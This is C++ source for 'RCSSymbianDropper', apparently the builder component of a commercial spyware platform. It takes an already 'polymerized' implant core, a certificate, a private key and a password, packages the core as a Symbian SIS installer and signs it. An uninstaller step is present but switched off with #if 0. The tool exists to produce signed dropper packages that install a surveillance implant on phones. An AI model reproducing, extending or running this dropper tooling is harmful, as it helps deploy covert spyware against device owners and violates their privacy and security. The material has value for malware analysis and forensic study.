
#include "stdafx.h"
#include <Windows.h>
#include "dropper.h"

int _tmain(int argc, _TCHAR* argv[])
{
	HANDLE hFile;
	WCHAR wsCERFile[MAX_PATH];
	WCHAR wsKEYFile[MAX_PATH];
	WCHAR wsPass[MAX_PATH];
	WCHAR wsCoreFile[MAX_PATH];
	WCHAR wsUnFile[MAX_PATH];
	WCHAR wsOutFile[MAX_PATH];
	unsigned int iLen = 0;

	if (argc != 7) {
		printf("ERROR: \n");
		printf("  usage:  RCSSymbianDropper.exe <core> <cer> <key> <pass> <uninstaller> <output>\n\n");
		printf("  <core> is the core already polymerized\n");
		printf("  <cer> is the certificate to sign the sysx\n");
		printf("  <key> is the private key of the certificate\n");
		printf("  <pass> is the password of the certificates\n");
		printf("  <uninstaller> is the core uninstaller\n");
		printf("  <output> is the output file (without extension)\n\n");
		return 0;
	}

	wsprintf(wsCoreFile, L"%s", argv[1]);
	wsprintf(wsCERFile, L"%s", argv[2]);
	wsprintf(wsKEYFile, L"%s", argv[3]);
	wsprintf(wsPass, L"%s", argv[4]);
	wsprintf(wsUnFile, L"%s", argv[5]);
	wsprintf(wsOutFile, L"%s", argv[6]);

	/************************************************************************/
	/*  SANITY CHECKS                                                       */
	/************************************************************************/

	if ( (hFile = CreateFile(wsCERFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find CER file [%S]\n", wsCERFile);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}

	if ( (hFile = CreateFile(wsKEYFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find KEY file [%S]\n", wsKEYFile);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}

	/************************************************************************/
	/*  READY TO GO                                                         */
	/************************************************************************/

	printf("Ready to go...\n");
	printf("INPUT CORE    [%S]\n", wsCoreFile);
	printf("CERFILE       [%S]\n", wsCERFile);
	printf("KEYFILE       [%S]\n", wsKEYFile);
	printf("PASSWORD      [%S]\n", wsPass);
	printf("UNINSTALLER   [%S]\n", wsUnFile);
	printf("OUTPUT FILE   [%S]\n\n", wsOutFile);


	/************************************************************************/
	/* UNINSTALLER SIS CREATION                                             */
	/************************************************************************/
#if 0
	if (CreateSis(SIS_UNINST, wsUnFile))
		printf("Creating uninstaller sis file... ok\n");
	else {
		printf("Cannot create uninstaller sis file [%S]\n", wsUnFile);
		return ERROR_EMBEDDING;
	}

	/************************************************************************/
	/* SIGNING THE UNINSTALLER                                              */
	/************************************************************************/


	if (SignSis(wsUnFile, wsCERFile, wsKEYFile, wsPass))
		printf("Using the certificate to sign the uninstaller... ok\n");
	else {
		printf("Cannot sign with the certificate file [%S][%S]\n", wsCERFile, wsKEYFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}
#endif
	/************************************************************************/
	/* FINAL SIS CREATION                                                   */
	/************************************************************************/

	if (CreateSis(SIS_CORE, wsOutFile))
		printf("Creating sis file... ok\n");
	else {
		printf("Cannot create sis file [%S]\n", wsCoreFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}

	/************************************************************************/
	/* SIGNING                                                              */
	/************************************************************************/

	if (SignSis(wsOutFile, wsCERFile, wsKEYFile, wsPass))
		printf("Using the certificate to sign the code... ok\n");
	else {
		printf("Cannot sign with the certificate file [%S][%S]\n", wsCERFile, wsKEYFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}


	printf("Output file... ok\n");


	return ERROR_SUCCESS;
}
